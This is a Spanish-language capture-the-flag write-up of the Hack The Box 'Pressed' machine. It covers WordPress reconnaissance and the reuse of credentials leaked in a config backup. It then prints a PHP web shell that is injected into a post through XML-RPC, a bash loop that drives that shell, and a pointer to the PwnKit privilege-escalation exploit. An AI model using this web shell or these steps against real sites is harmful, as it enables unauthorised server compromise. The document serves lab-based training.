# PRESSED

### Maquina pressed de HTB hard 

```
Hard
Linux

Skills:
Password Guessing
WordPress Abusing RPC Calls
WordPress XML-RPC Create WebShell
PwnKit Exploit
```

# Reconnaissance

```markdown
 Nmap 7.94SVN scan initiated Fri Jun  7 19:11:26 2024 as: nmap -sCV -oN target 10.10.11.142
Nmap scan report for 10.10.11.142
Host is up 0.17s latency).
Not shown: 999 filtered tcp ports ((no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: UHC Jan Finals &#8211; New Month, New Boxes
|_http-generator: WordPress 5.9
|_http-server-header: Apache/2.4.41 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Fri Jun  7 19:11:56 2024 -- 1 IP address (1 host up) scanned in 30.15 seconds


Nmap 7.94SVN scan initiated Sat Jun  8 01:51:48 2024 as: nmap --script http-enum -p80 -oN webscan 10.10.11.142
Nmap scan report for pressed.htb (10.10.11.142)
Host is up (0.18s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2
|   /: WordPress version: 5.9
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.

 Nmap done at Sat Jun  8 01:52:15 2024 -- 1 IP address (1 host up) scanned in 27.06 seconds

```

# Construccion de la pagina web 

### Comando para validar en que esta construida la pagina, nos estamos enfrentando a una pagina construida en wordpress 

`whatweb  http://10.10.11.142`

```
http://10.10.11.142 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.142], JQuery[3.6.0], MetaGenerator[WordPress 5.9], Script[text/javascript], Title[UHC Jan Finals &#8211; New Month, New Boxes], UncommonHeaders[link], WordPress[5.9]

```
### La pagina nos muestra todas las peticiones http que se estan realizando, entonces con cul podemos tirarle varias peticiones.

`curl -s -X GET 'http://10.10.11.142' -H 'User-Agent: super'`

### Como la pagina esta en wordpress podemos indentificar vulnerabilidades con `wpscan`

`wpscan --url 'http://10.10.11.142'`

```_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.11.142/ [10.10.11.142]
[+] Started: Sat Jun  8 23:48:32 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.11.142/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.11.142/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.11.142/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.11.142/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.9 identified (Insecure, released on 2022-01-25).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.11.142/index.php/feed/, <generator>https://wordpress.org/?v=5.9</generator>
 |  - http://10.10.11.142/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.9</generator>

[+] WordPress theme in use: retrogeek
 | Location: http://10.10.11.142/wp-content/themes/retrogeek/
 | Last Updated: 2024-04-26T00:00:00.000Z
 | Readme: http://10.10.11.142/wp-content/themes/retrogeek/README.txt
 | [!] The version is out of date, the latest version is 0.7
 | Style URL: http://10.10.11.142/wp-content/themes/retrogeek/style.css?ver=42
 | Style Name: RetroGeek
 | Style URI: https://tuxlog.de/retrogeek/
 | Description: A lightweight, minimal, fast and geeky retro theme remembering the good old terminal times...
 | Author: tuxlog
 | Author URI: https://tuxlog.de/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 0.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.11.142/wp-content/themes/retrogeek/style.css?ver=42, Match: 'Version: 0.5'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:06 <=====================================================================================================================> (137 / 137) 100.00% Time: 00:00:06

[i] Config Backup(s) Identified:

[!] http://10.10.11.142/wp-config.php.bak
 | Found By: Direct Access (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Jun  8 23:48:54 2024
[+] Requests Done: 173
[+] Cached Requests: 5
[+] Data Sent: 43.122 KB
[+] Data Received: 125.799 KB
[+] Memory used: 275.938 MB
[+] Elapsed time: 00:00:21
```
### En el analisis realizado por realizado por `WPSCAN` se observa que hay 2 sitios uno con un backup de la configuracion del sitio y otro que permite realiza peticiones

`http://10.10.11.142/wp-config.php.bak`

`http://10.10.11.142/xmlrpc.php`

### Se descargo la configuracion y se ve una credencial

```
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'admin' );

/** Database password */
define( 'DB_PASSWORD', 'uhc-jan-finals-2021' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

```

### Petición al xmlrpc.php 

`curl -s -X POST 'http://10.10.11.142/xmlrpc.php'`

```
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>-32700</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>parse error. not well formed</string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```

### Se realiza prueba en la url `/wp-login.php` y las credenciales funcionaron cambiando el año pero salio una validacion de doble autenticación

### al validar se realizo un codigo en python para poder hacer peticiones a xmlrpc.php, con la libreria:

```
from wordpress_xmlrpc import Client
from wordpress_xmlrpc.methods import posts
client = Client("http://pressed.htb/xmlrpc.php", "admin", "uhc-jan-finals-2022")
post = client.call(posts.GetPosts())

```

### Salida

```
>>> dir(post[0])
['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_def', 'comment_status', 'content', 'custom_fields', 'date', 'date_modified', 'definition', 'excerpt', 'guid', 'id', 'link', 'menu_order', 'mime_type', 'parent_id', 'password', 'ping_status', 'post_format', 'post_status', 'post_type', 'slug', 'sticky', 'struct', 'terms', 'thumbnail', 'title', 'user']


>>> dir(post[0])
['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__',, '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__went', 'custom_fields', 'date', 'date_modified', 'definition', 'excerpt', 'guid', 'id', 'link', 'menu_order', 'mime_type', 'parent_id', 'password', 'ping_st_type', 'slug', 'sticky', 'struct', 'terms', 'thumbnail', 'title', 'user']

>>> post[0].content
'<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the ament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event h -->\n\n<!-- wp:php-everywhere-block/php {"code":"JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0I<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'

```
### Despues de eso en el post 1 y unico post se observa que hay un codigo codificado en base64. 

### Decodificando codigo

`echo "JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U" | base64 -d; echo`
### Salida
`%3C%3Fphp%20%20echo(file_get_contents('%2Fvar%2Fwww%2Fhtml%2Foutput.log'))%3B%20%3F%3Ebase64: invalid input`

### Decodificando en php en la consola interactiva

`php --interactive `
`php > echo urldecode('%3C%3Fphp%20%20echo(file_get_contents(\'%2Fvar%2Fwww%2Fhtml%2Foutput.log\'))%3B%20%3F%3E');`

### Salida
`<?php  echo(file_get_contents('/var/www/html/output.log')); ?>`

### Teniendo en cuenta que tenemos un comando de maquina codificado en base64, podemos proceder a crear un comando para interactuar el shell de la siguiente forma

### Creamos un archivo llamado data que contenga el siguiente codigo en php

```
cat data
<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']). "</prev>";
?>

```

### Despues de eso con la funcion `base64` procedemos a convertir el contenido del archivo en base64
`base64 -w 0 data`

### Salida
`PD9waHAKICAgIGVjaG8gIjxwcmU+IiAuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWydjbWQnXSkuICI8L3ByZT4iOyAKPz4K`

### Despues con ayuda del script de python debemos crear una nueva variable con la salida del `post.content` modificados el conenido de base64 y despues lo subimos

### Nombramiento de la variable con el contenido.

`malicious_post = post[0]`

### Modificacion de la variable

```
malicious_post = '<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywhere-block/php {"code":"PD9waHAKICAgIGVjaG8gIjxwcmU+IiAuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWydjbWQnXSkuICI8L3ByZT4iOyAKPz4K","version":"3.0. 0"} /-->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'

```

### modificacion del post

```
>>> client.call(posts.EditPost(malicious_post.id,malicious_post))
True

```

### Despues recargamos la pagina evidenciamos que ya no nos genera el mensaje de consulta, y podemos modificar la url par que no muestre comandos por consola

`http://pressed.htb/index.php/2022/01/28/hello-world/?cmd=whoami`

### ahora tenemos consultas a los directorios del servidor para eso podemos hacer una fakeshell.

```
#!/bin/bash

function control_c(){
    echo -e "\n\n[!]Saliendo..\n"
    exit 1
}

#Control-C
trap control_c INT

main_url='http://pressed.htb/index.php/2022/01/28/hello-world/?cmd='

while [ "$command" != "exit"  ]; do
    echo -n "$~ " && read -r command
    command="$(echo "$command 2>%261" | tr ' ' '+')"

    curl -s -X GET "$main_url$command" | grep "<pre>" -A 100 | grep "</pre>" -B 100 | sed 's/<pre>//' | sed 's/<\/pre>//'

done

```
### Teniendo las consultas podemos abusar de la vulnerabilidad `CVE-2021-4034`

https://github.com/kimusan/pkwner?tab=readme-ov-file

